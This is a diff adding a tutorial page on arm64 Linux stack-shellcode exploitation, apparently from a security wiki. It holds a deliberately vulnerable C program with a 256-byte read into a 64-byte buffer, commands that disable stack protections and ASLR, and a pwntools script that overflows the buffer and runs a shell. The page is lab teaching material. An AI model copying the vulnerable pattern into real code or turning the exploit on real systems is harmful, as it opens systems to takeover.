@@ -1,0 +1,82 @@
+# Stack Shellcode - arm64
+
+Find an introduction to arm64 in:
+
+## Linux
+
+### Code
+
+```c
+#include <stdio.h>
+#include <unistd.h>
+
+void vulnerable_function() {
+    char buffer[64];
+    read(STDIN_FILENO, buffer, 256); // <-- bof vulnerability
+}
+
+int main() {
+    vulnerable_function();
+    return 0;
+}
+```
+
+Compile without pie, canary and nx:
+
+```bash
+clang -o bof bof.c -fno-stack-protector -Wno-format-security -no-pie -z execstack
+```
+
+### No ASLR & No canary - Stack Overflow
+
+To stop ASLR execute:
+
+```bash
+echo 0 | sudo tee /proc/sys/kernel/randomize_va_space
+```
+
+To get the [**offset of the bof check this link**](../ret2win/ret2win-arm64.md#finding-the-offset).
+
+Exploit:
+
+```python
+from pwn import *
+
+# Load the binary
+binary_name = './bof'
+elf = context.binary = ELF(binary_name)
+
+# Generate shellcode
+shellcode = asm(shellcraft.sh())
+
+# Start the process
+p = process(binary_name)
+
+# Offset to return address
+offset = 72
+
+# Address in the stack after the return address
+ret_address = p64(0xfffffffff1a0)
+
+# Craft the payload
+payload = b'A' * offset + ret_address + shellcode
+
+print("Payload length: "+ str(len(payload)))
+
+# Send the payload
+p.send(payload)
+
+# Drop to an interactive session
+p.interactive()
+```
+
+The only "complicated" thing to find here would be the address in the stack to call. In my case I generated the exploit with the address found using gdb, but then when exploiting it it didn't work (because the stack address changed a bit).
+
+I opened the generated **`core` file** (`gdb ./bog ./core`) and checked the real address of the start of the shellcode.
+
+## macOS
+
+> [!TIP]
+> It's not possible to disable NX in macOS because in arm64 this mode is implemented at hardware level so you can't disable it, so you won't be finding examples with shellcode in stack in macOS.
+
+Check a macOS ret2win example in:
